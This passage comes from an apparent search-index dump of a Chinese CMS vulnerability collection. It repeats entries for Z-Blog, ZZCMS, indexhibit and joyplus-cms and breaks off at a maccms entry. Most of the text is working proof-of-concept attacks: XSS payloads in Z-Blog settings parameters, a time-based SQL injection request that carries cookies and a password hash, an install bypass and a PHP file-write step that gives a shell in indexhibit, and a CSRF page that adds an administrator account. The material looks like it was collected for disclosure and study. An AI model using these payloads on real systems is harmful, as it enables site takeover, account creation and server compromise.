\u00b6 ZC_BLOG_SUBNAME\u53c2\u6570poc\u4ee3\u7801: ``` raw post_url\uff1a http://localhost/z-blog/zb_system/cmd.php?act=SettingSav&token=2c7ca9a4c1c3d856e012595ca878564f post_data: ZC_BLOG_HOST=http%3A%2F%2Flocalhost%2Fz-blog%2F&ZC_PERMANENT_DOMAIN_ENABLE=&ZC_PERMANENT_DOMAIN_WITH_ADMIN=&ZC_BLOG_NAME=admin&ZC_BLOG_SUBNAME=Good%20Luck%20To%20You!tluf3%22%3e%3cscript%3ealert(1)%3c%2fscript%3euk095&ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&ZC_TIME_ZONE_NAME=Asia%2FShanghai&ZC_BLOG_LANGUAGEPACK=zh-cn&ZC_UPLOAD_FILETYPE=jpg%7Cgif%7Cpng%7Cjpeg%7Cbmp%7Cpsd%7Cwmf%7Cico%7Crpm%7Cdeb%7Ctar%7Cgz%7Csit%7C7z%7Cbz2%7Czip%7Crar%7Cxml%7Cxsl%7Csvg%7Csvgz%7Crtf%7Cdoc%7Cdocx%7Cppt%7Cpptx%7Cxls%7Cxlsx%7Cwps%7Cchm%7Ctxt%7Cpdf%7Cmp3%7Cmp4%7Cavi%7Cmpg%7Crm%7Cra%7Crmvb%7Cmov%7Cwmv%7Cwma%7Cswf%7Cfla%7Ctorrent%7Capk%7Czba%7Cgzba&ZC_UPLOAD_FILESIZE=2&ZC_DEBUG_MODE=&ZC_GZIP_ENABLE=&ZC_SYNTAXHIGHLIGHTER_ENABLE=1&ZC_CLOSE_SITE=&ZC_DISPLAY_COUNT=10&ZC_DISPLAY_SUBCATEGORYS=1&ZC_PAGEBAR_COUNT=10&ZC_SEARCH_COUNT=20&ZC_MANAGE_COUNT=50&ZC_COMMENT_TURNOFF=&ZC_COMMENT_AUDIT=&ZC_COMMENT_REVERSE_ORDER=&ZC_COMMENTS_DISPLAY_COUNT=100&ZC_COMMENT_VERIFY_ENABLE= ``` ZC_UPLOAD_FILETYPE\u53c2\u6570poc\u4ee3\u7801: post_data: ZC_BLOG_HOST=http://localhost/z-blog/&ZC_PERMANENT_DOMAIN_ENABLE=&ZC_PERMANENT_DOMAIN_WITH_ADMIN=&ZC_BLOG_NAME=admin&ZC_BLOG_SUBNAME=Good+Luck+To+You!&ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&ZC_TIME_ZONE_NAME=Asia/Shanghai&ZC_BLOG_LANGUAGEPACK=zh-cn&ZC_UPLOAD_FILETYPE=jpg|gif|png|jpeg|bmp|psd|wmf|ico|rpm|deb|tar|gz|sit|7z|bz2|zip|rar|xml|xsl|svg|svgz|rtf|doc|docx|ppt|pptx|xls|xlsx|wps|chm|txt|pdf|mp3|mp4|avi|mpg|rm|ra|rmvb|mov|wmv|wma|swf|fla|torrent|apk|zba|gzbauckek\"><script>alert(1)</script>ekkgh&ZC_UPLOAD_FILESIZE=2&ZC_DEBUG_MODE=&ZC_GZIP_ENABLE=&ZC_SYNTAXHIGHLIGHTER_ENABLE=1&ZC_CLOSE_SITE=&ZC_DISPLAY_COUNT=10&ZC_DISPLAY_SUBCATEGORYS=1&ZC_PAGEBAR_COUNT=10&ZC_SEARCH_COUNT=20&ZC_MANAGE_COUNT=50&ZC_COMMENT_TURNOFF=&ZC_COMMENT_AUDIT=&ZC_COMMENT_REVERSE_ORDER=&ZC_COMMENTS_DISPLAY_COUNT=100&ZC_COMMENT_VERIFY_ENABLE=","title":"Z Blog 1.5.1.1740\u5b58\u5728XSS\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Z-Blog 1.5.1.1740\u5b58\u5728XSS\u6f0f\u6d1e 2018-04-05 zzw ( zzw@5ecurity.cn ) https://www.zblogcn.com/ https://github.com/zblogcn/zblogphp 1.5.1.1740 CVE-2018-7736","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_2","text":"Z-BlogPHP 1.5.1.1740\u7248\u672c\u7684cmd.php\u9875\u9762ZC_BLOG_SUBNAME\u53caZC_UPLOAD_FILETYPE\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u53ef\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#poc","text":"ZC_BLOG_SUBNAME\u53c2\u6570poc\u4ee3\u7801: ``` raw post_url\uff1a http://localhost/z-blog/zb_system/cmd.php?act=SettingSav&token=2c7ca9a4c1c3d856e012595ca878564f post_data: ZC_BLOG_HOST=http%3A%2F%2Flocalhost%2Fz-blog%2F&ZC_PERMANENT_DOMAIN_ENABLE=&ZC_PERMANENT_DOMAIN_WITH_ADMIN=&ZC_BLOG_NAME=admin&ZC_BLOG_SUBNAME=Good%20Luck%20To%20You!tluf3%22%3e%3cscript%3ealert(1)%3c%2fscript%3euk095&ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&ZC_TIME_ZONE_NAME=Asia%2FShanghai&ZC_BLOG_LANGUAGEPACK=zh-cn&ZC_UPLOAD_FILETYPE=jpg%7Cgif%7Cpng%7Cjpeg%7Cbmp%7Cpsd%7Cwmf%7Cico%7Crpm%7Cdeb%7Ctar%7Cgz%7Csit%7C7z%7Cbz2%7Czip%7Crar%7Cxml%7Cxsl%7Csvg%7Csvgz%7Crtf%7Cdoc%7Cdocx%7Cppt%7Cpptx%7Cxls%7Cxlsx%7Cwps%7Cchm%7Ctxt%7Cpdf%7Cmp3%7Cmp4%7Cavi%7Cmpg%7Crm%7Cra%7Crmvb%7Cmov%7Cwmv%7Cwma%7Cswf%7Cfla%7Ctorrent%7Capk%7Czba%7Cgzba&ZC_UPLOAD_FILESIZE=2&ZC_DEBUG_MODE=&ZC_GZIP_ENABLE=&ZC_SYNTAXHIGHLIGHTER_ENABLE=1&ZC_CLOSE_SITE=&ZC_DISPLAY_COUNT=10&ZC_DISPLAY_SUBCATEGORYS=1&ZC_PAGEBAR_COUNT=10&ZC_SEARCH_COUNT=20&ZC_MANAGE_COUNT=50&ZC_COMMENT_TURNOFF=&ZC_COMMENT_AUDIT=&ZC_COMMENT_REVERSE_ORDER=&ZC_COMMENTS_DISPLAY_COUNT=100&ZC_COMMENT_VERIFY_ENABLE= ``` ZC_UPLOAD_FILETYPE\u53c2\u6570poc\u4ee3\u7801: post_data: ZC_BLOG_HOST=http://localhost/z-blog/&ZC_PERMANENT_DOMAIN_ENABLE=&ZC_PERMANENT_DOMAIN_WITH_ADMIN=&ZC_BLOG_NAME=admin&ZC_BLOG_SUBNAME=Good+Luck+To+You!&ZC_BLOG_COPYRIGHT=Copyright+Your+WebSite.Some+Rights+Reserved.&ZC_TIME_ZONE_NAME=Asia/Shanghai&ZC_BLOG_LANGUAGEPACK=zh-cn&ZC_UPLOAD_FILETYPE=jpg|gif|png|jpeg|bmp|psd|wmf|ico|rpm|deb|tar|gz|sit|7z|bz2|zip|rar|xml|xsl|svg|svgz|rtf|doc|docx|ppt|pptx|xls|xlsx|wps|chm|txt|pdf|mp3|mp4|avi|mpg|rm|ra|rmvb|mov|wmv|wma|swf|fla|torrent|apk|zba|gzbauckek\"><script>alert(1)</script>ekkgh&ZC_UPLOAD_FILESIZE=2&ZC_DEBUG_MODE=&ZC_GZIP_ENABLE=&ZC_SYNTAXHIGHLIGHTER_ENABLE=1&ZC_CLOSE_SITE=&ZC_DISPLAY_COUNT=10&ZC_DISPLAY_SUBCATEGORYS=1&ZC_PAGEBAR_COUNT=10&ZC_SEARCH_COUNT=20&ZC_MANAGE_COUNT=50&ZC_COMMENT_TURNOFF=&ZC_COMMENT_AUDIT=&ZC_COMMENT_REVERSE_ORDER=&ZC_COMMENTS_DISPLAY_COUNT=100&ZC_COMMENT_VERIFY_ENABLE=","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/","text":"ZZCMS201910 SQL Injections SQL\u6ce8\u5165 \u00b6 \u524d\u63d0\u662f\u4f60\u6709\u4e00\u4e2a\u5177\u6709\u8d2d\u4e70\u6743\u9650\u7684VIP\u4f1a\u5458\u8d26\u6237 \u4e0d\u7136\u4f1a\u63d0\u793a\uff1a \"\u60a8\u6240\u5728\u7684\u7528\u6237\u7ec4\u6ca1\u6709\u4e0b\u8f7d\u6b64\u4fe1\u606f\u7684\u6743\u9650\uff01<br><input type=button value=\u5347\u7ea7\u6210VIP\u4f1a\u5458 onclick=\\\"location.href='/one/vipuser.php'\\\"/>\" \u6ce8\u5165\u70b9 user/dls_download with parameter $id \u00b6 \u5229\u7528POC\u5982\u4e0b \u00b6 POST /user/dls_download.php HTTP/1.1 Host: test.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 45 Origin: http://test.com Connection: close Referer: http://test.com/user/advzt_manage.php Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1576564072; Hm_lvt_520556228c0113270c0c772027905838=1576734687,1577071433; app_href_source=myapp/free; PHPSESSID=f0fb73cc2f2d41d2a3b1edb7340841a3; arrlanguage=metinfo; Hm_lpvt_520556228c0113270c0c772027905838=1577672843; acc_auth=4b90lwFZZGUdz47dUybObYz1MoB612Tg7bCn10U0P4BKoY%2FR9nnvQapvPIBF%2BB4w11KPOWCNH%2FLvwx9rH7424ZH0; acc_key=eXM7G4F; __tins__713776=%7B%22sid%22%3A%201577775703119%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201577777503119%7D; __51cke__=; __51laig__=28; bdshare_firstime=1577771760963; UserName=test; PassWord=4297f44b13955235245b2497399d7a93 Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache id[]=1&id[]=2)%0aor%0asleep(5)%23&FileExt=xxx \u6765\u6e90\u4e0e\uff1a https://github.com/JcQSteven/blog/issues/15","title":"ZZCMS201910 SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/#zzcms201910-sql-injections-sql","text":"\u524d\u63d0\u662f\u4f60\u6709\u4e00\u4e2a\u5177\u6709\u8d2d\u4e70\u6743\u9650\u7684VIP\u4f1a\u5458\u8d26\u6237 \u4e0d\u7136\u4f1a\u63d0\u793a\uff1a \"\u60a8\u6240\u5728\u7684\u7528\u6237\u7ec4\u6ca1\u6709\u4e0b\u8f7d\u6b64\u4fe1\u606f\u7684\u6743\u9650\uff01<br><input type=button value=\u5347\u7ea7\u6210VIP\u4f1a\u5458 onclick=\\\"location.href='/one/vipuser.php'\\\"/>\"","title":"ZZCMS201910 SQL Injections SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/#userdls_download-with-parameter-id","text":"","title":"\u6ce8\u5165\u70b9 user/dls_download with parameter $id"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/ZZCMS/ZZCMS201910%20SQL%E6%B3%A8%E5%85%A5/#poc","text":"POST /user/dls_download.php HTTP/1.1 Host: test.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 45 Origin: http://test.com Connection: close Referer: http://test.com/user/advzt_manage.php Cookie: Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1576564072; Hm_lvt_520556228c0113270c0c772027905838=1576734687,1577071433; app_href_source=myapp/free; PHPSESSID=f0fb73cc2f2d41d2a3b1edb7340841a3; arrlanguage=metinfo; Hm_lpvt_520556228c0113270c0c772027905838=1577672843; acc_auth=4b90lwFZZGUdz47dUybObYz1MoB612Tg7bCn10U0P4BKoY%2FR9nnvQapvPIBF%2BB4w11KPOWCNH%2FLvwx9rH7424ZH0; acc_key=eXM7G4F; __tins__713776=%7B%22sid%22%3A%201577775703119%2C%20%22vd%22%3A%201%2C%20%22expires%22%3A%201577777503119%7D; __51cke__=; __51laig__=28; bdshare_firstime=1577771760963; UserName=test; PassWord=4297f44b13955235245b2497399d7a93 Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache id[]=1&id[]=2)%0aor%0asleep(5)%23&FileExt=xxx \u6765\u6e90\u4e0e\uff1a https://github.com/JcQSteven/blog/issues/15","title":"\u5229\u7528POC\u5982\u4e0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/","text":"\u524d\u8a00 \u00b6 CVE-2019-16314 indexhibit cms v2.1.5 \u5b58\u5728\u91cd\u88c5\u5e76\u5bfc\u81f4getshell \u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u591c\u7a0b \u53d1\u73b0indexhibit cms v2.1.5 \u5b58\u5728\u91cd\u88c5\u5e76\u5bfc\u81f4getshell \u6f0f\u6d1e \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u5982\u679c\u6ca1\u6709\u5220\u9664 install.php \u5219\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u63d0\u4ea4\u53c2\u6570\u8fdb\u884c\u91cd\u88c5\uff0c\u5e76\u5728\u540e\u53f0\u76f4\u63a5getshell \u5f71\u54cd\u8303\u56f4 \u00b6 \u4ea7\u54c1 \u00b6 indexhibit cms \u7248\u672c \u00b6 indexhibit cms v2.1.5 \u7248\u672c \u7ec4\u4ef6 \u00b6 indexhibit cms \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u76f4\u63a5\u8bbf\u95ee/ndxzstudio/install.php\uff0c\u63d0\u793a\u5df2\u5b89\u88c5 \u4f46\u662f\uff0c\u901a\u8fc7\u53c2\u6570p\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u76f4\u63a5\u91cd\u65b0\u5b89\u88c5 \u586b\u5199\u76f8\u5173\u4fe1\u606f\u540e\u5b89\u88c5\u6210\u529f\uff1a POC\uff1a \u00b6 /ndxzstudio/install.php?p=2","title":"CVE 2019 16314 indexhibit cms v2.1.5 \u5b58\u5728\u91cd\u88c5\u5e76\u5bfc\u81f4getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_1","text":"CVE-2019-16314 indexhibit cms v2.1.5 \u5b58\u5728\u91cd\u88c5\u5e76\u5bfc\u81f4getshell","title":"\u524d\u8a00"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_2","text":"\u591c\u7a0b \u53d1\u73b0indexhibit cms v2.1.5 \u5b58\u5728\u91cd\u88c5\u5e76\u5bfc\u81f4getshell \u6f0f\u6d1e","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_3","text":"\u5982\u679c\u6ca1\u6709\u5220\u9664 install.php \u5219\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u63d0\u4ea4\u53c2\u6570\u8fdb\u884c\u91cd\u88c5\uff0c\u5e76\u5728\u540e\u53f0\u76f4\u63a5getshell","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_4","text":"","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_5","text":"indexhibit cms","title":"\u4ea7\u54c1"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_6","text":"indexhibit cms v2.1.5 \u7248\u672c","title":"\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_7","text":"indexhibit cms","title":"\u7ec4\u4ef6"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#_8","text":"\u76f4\u63a5\u8bbf\u95ee/ndxzstudio/install.php\uff0c\u63d0\u793a\u5df2\u5b89\u88c5 \u4f46\u662f\uff0c\u901a\u8fc7\u53c2\u6570p\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u76f4\u63a5\u91cd\u65b0\u5b89\u88c5 \u586b\u5199\u76f8\u5173\u4fe1\u606f\u540e\u5b89\u88c5\u6210\u529f\uff1a","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/CVE-2019-16314%20indexhibit%20cms%20v2.1.5%20%E5%AD%98%E5%9C%A8%E9%87%8D%E8%A3%85%E5%B9%B6%E5%AF%BC%E8%87%B4getshell/#poc","text":"/ndxzstudio/install.php?p=2","title":"POC\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 indexhibit cms v2.1.5 \u76f4\u63a5\u7f16\u8f91php\u6587\u4ef6getshell 2019-02-20 yc\uff08 3365487579@qq.com \uff09 https://www.indexhibit.org/ https://www.indexhibit.org/ v2.1.5 CVE-2019-8954 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 indexhibit CMS 2.1.5\u7248\u672c\u5b58\u5728\u4e00\u4e2a\u76f4\u63a5\u7f16\u8f91php\u6587\u4ef6\u7684\u6f0f\u6d1e\uff0c\u5bfc\u81f4getshell\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 \u5f53\u6211\u4eec\u767b\u5f55\u8fdb\u540e\u53f0\u540e\uff0c\u5411/ndxzstudio/?a=system post\u6570\u636e\uff1a upd_jxcode=true&v=%253C%253Fphp%2520phpinfo()%253B%253F%253E&id=%2Fcss%2Faudio.php \u5373\u53ef\u5728/css/\u76ee\u5f55\u5199\u5165\u4e00\u4e2aphp\u6587\u4ef6audio.php\u3002 \u6210\u529fgetshell\uff1a","title":"Indexhibit cms v2.1.5 \u76f4\u63a5\u7f16\u8f91php\u6587\u4ef6getshell"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 indexhibit cms v2.1.5 \u76f4\u63a5\u7f16\u8f91php\u6587\u4ef6getshell 2019-02-20 yc\uff08 3365487579@qq.com \uff09 https://www.indexhibit.org/ https://www.indexhibit.org/ v2.1.5 CVE-2019-8954","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/#_2","text":"indexhibit CMS 2.1.5\u7248\u672c\u5b58\u5728\u4e00\u4e2a\u76f4\u63a5\u7f16\u8f91php\u6587\u4ef6\u7684\u6f0f\u6d1e\uff0c\u5bfc\u81f4getshell\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/indexhibitCMS/indexhibit%20cms%20v2.1.5%20%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%BE%91php%E6%96%87%E4%BB%B6getshell/#poc","text":"\u5f53\u6211\u4eec\u767b\u5f55\u8fdb\u540e\u53f0\u540e\uff0c\u5411/ndxzstudio/?a=system post\u6570\u636e\uff1a upd_jxcode=true&v=%253C%253Fphp%2520phpinfo()%253B%253F%253E&id=%2Fcss%2Faudio.php \u5373\u53ef\u5728/css/\u76ee\u5f55\u5199\u5165\u4e00\u4e2aphp\u6587\u4ef6audio.php\u3002 \u6210\u529fgetshell\uff1a","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 joyplus-cms 1.6.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-03-14 yx\uff08 yx@5ecurity.cn \uff09 https://github.com/joyplus/joyplus-cms/ https://github.com/joyplus/joyplus-cms/ 1.6.0 CVE-2018-8717 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 joyplus-cms 1.6.0\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u5c06\u666e\u901a\u7528\u6237\u63d0\u6210\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002joyplus-cms\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://192.168.126.129/joyplus-cms-master/joyplus-cms/manager/admin_ajax.php?action=save&tab={pre}manager\" method = \"POST\" > < input type = \"hidden\" name = \"m&#95;id\" value = \"\" /> < input type = \"hidden\" name = \"flag\" value = \"add\" /> < input type = \"hidden\" name = \"m&#95;name\" value = \"admin1\" /> < input type = \"hidden\" name = \"m&#95;password\" value = \"admin1\" /> < input type = \"hidden\" name = \"m&#95;status\" value = \"1\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"joyplus cms 1.6.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 joyplus-cms 1.6.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-03-14 yx\uff08 yx@5ecurity.cn \uff09 https://github.com/joyplus/joyplus-cms/ https://github.com/joyplus/joyplus-cms/ 1.6.0 CVE-2018-8717","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","text":"joyplus-cms 1.6.0\u5b58\u5728CSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u5c06\u666e\u901a\u7528\u6237\u63d0\u6210\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002joyplus-cms\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/joyplusCMS/joyplus-cms%201.6.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","text":"CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://192.168.126.129/joyplus-cms-master/joyplus-cms/manager/admin_ajax.php?action=save&tab={pre}manager\" method = \"POST\" > < input type = \"hidden\" name = \"m&#95;id\" value = \"\" /> < input type = \"hidden\" name = \"flag\" value = \"add\" /> < input type = \"hidden\" name = \"m&#95;name\" value = \"admin1\" /> < input type = \"hidden\" name = \"m&#95;password\" value = \"admin1\" /> < input type = \"hidden\" name = \"m&#95;status\" value = \"1\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/macCMS/maccms_v10%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 